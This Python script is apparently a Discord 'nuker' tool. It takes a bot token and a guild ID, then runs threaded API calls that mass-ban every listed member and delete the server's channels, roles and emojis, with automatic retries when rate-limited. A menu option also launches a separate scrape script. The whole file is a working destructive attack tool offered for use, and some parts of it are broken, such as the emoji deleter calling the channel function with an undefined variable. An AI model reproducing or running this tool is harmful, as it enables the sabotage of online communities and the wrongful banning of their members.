import threading
import time
import requests
import os
from colorama import Fore
members = open('members.txt')
roles = open('roles.txt')
channels = open('channels.txt')
emojis = open('emojis.txt')
os.system("clear")
token = input(f"{Fore.GREEN}Token{Fore.WHITE}: ")
os.system("clear")
guild = input(f"{Fore.GREEN}Guild{Fore.WHITE}: ")
os.system("clear")
headers = {'Authorization': "Bot " + token}
def ban(i):
    while True:
        r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{i}", headers=headers)
        print(f"{Fore.GREEN}[{Fore.WHITE} - {Fore.GREEN}]{Fore.WHITE} Banned user")
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"{Fore.GREEN}[{Fore.WHITE} - {Fore.GREEN}]{Fore.WHITE} Got ratelimited, retrying after:  {r.json()['retry_after']} s.")
        else:
           break
def channel(u):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers)
       print(f"{Fore.GREEN}[{Fore.WHITE} - {Fore.GREEN}]{Fore.WHITE} Deleted channel")
       if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"{Fore.GREEN}[{Fore.WHITE} - {Fore.GREEN}]{Fore.WHITE} Got ratelimited, retrying after: {r.json()['retry_after']} s.")
            keep_alive()
       else:
          break
def role(k):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{k}", headers=headers)
       print(f"{Fore.GREEN}[{Fore.WHITE} - {Fore.GREEN}]{Fore.WHITE} Deleted role")
       if 'retry_after' in r.text:
           time.sleep(r.json()['retry_after'])
           print(f"{Fore.GREEN}[{Fore.WHITE} - {Fore.GREEN}]{Fore.WHITE} Got ratelimited, retrying after: {r.json()['retry_after']} s.")
           keep_alive()
       else:
           break
def emoji(a):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/emojis/{a}", headers=headers)
       print(f"{Fore.GREEN}[{Fore.WHITE} - {Fore.GREEN}]{Fore.WHITE} Deleted emoji")
       if 'retry_after' in r.text:
           time.sleep(r.json()['retry_after'])
           print(f"{Fore.GREEN}[{Fore.WHITE} - {Fore.GREEN}]{Fore.WHITE} Got ratelimited, retrying after: {r.json()['retry_after']} s.")
           keep_alive()
       else:
            break
class channeldelete(threading.Thread):
	def __init__(self, iD, name):
		threading.Thread.__init__(self)
		self.iD = iD
		self.name = name
	def run(self):
		 for c in channels:
		     p = threading.Thread(target=channel, args=(c,))
		     p.start()
class emojidelete(threading.Thread):
	def __init__(self, iD, name):
		threading.Thread.__init__(self)
		self.iD = iD
		self.name = name
	def run(self):
		 for e in emojis:
		     v = threading.Thread(target=channel, args=(c,))
		     v.start()
class roledelete(threading.Thread):
	def __init__(self, iD, name):
		threading.Thread.__init__(self)
		self.iD = iD
		self.name = name
	def run(self):
		 for r in roles:
		     y = threading.Thread(target=role, args=(r,))
		     y.start()
class massban(threading.Thread):
	def __init__(self, iD, name):
		threading.Thread.__init__(self)
		self.iD = iD
		self.name = name
	def run(self):
		 for m in members:
		     x = threading.Thread(target=ban, args=(m,))
		     x.start()
def start_emoji():
	d1.start()
	d2.start()
d1 = emojidelete(1, "f1")
d2 = emojidelete(2, "f2")
def start_role():
	f1.start()
	f2.start()
f1 = roledelete(1, "f1")
f2 = roledelete(2, "f2")
def start_channel():
	g1.start()
	g2.start()
g1 = channeldelete(1 , "g1")
g2 = channeldelete(2 , "g2")
def start_ban():
	t1.start()
	t2.start()
t1 = massban(1, "t1")
t2 = massban(2, "t2")
print(Fore.GREEN + f'''
             ╔╦╗╦ ╦╔═╗
              ║ ╠═╣║  
              ╩ ╩ ╩╚═╝{Fore.WHITE}
          ╔╗╔╦ ╦╦╔═╔═╗╦═╗
          ║║║║ ║╠╩╗║╣ ╠╦╝
          ╝╚╝╚═╝╩ ╩╚═╝╩╚═

{Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}]{Fore.WHITE} massban       {Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}]{Fore.WHITE} delete channels\n{Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}]{Fore.WHITE} delete roles  {Fore.GREEN}[{Fore.WHITE}4{Fore.GREEN}]{Fore.WHITE} delete emojis\n{Fore.GREEN}[{Fore.WHITE}5{Fore.GREEN}]{Fore.WHITE} scrape server\n\n''')
def main():
	ok = input(f"{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}")
	if ok == "1":
		os.system("clear")
		start_ban()
		main()
	elif ok == "2":
		os.system("clear")
		start_channel()
		main()
	elif ok == "3":
		os.system("clear")
		start_role()
		main()
	elif ok == "4":
		os.system("clear")
		start_emoji()
		main()
	elif ok == "5":
		os.system("clear")
		os.system("python scrape.py")
main()